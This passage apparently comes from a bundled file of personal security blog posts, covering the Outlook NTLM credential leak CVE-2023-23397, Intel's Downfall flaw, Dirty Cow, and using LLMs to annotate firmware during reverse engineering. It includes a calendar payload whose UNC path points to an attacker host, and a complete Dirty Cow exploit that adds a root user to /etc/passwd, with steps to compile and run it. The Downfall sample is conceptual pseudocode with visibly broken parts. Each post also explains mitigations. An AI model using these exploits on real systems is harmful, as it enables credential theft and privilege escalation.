        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,AS=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,CS=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,RS=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
  </p>

  <p>
    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
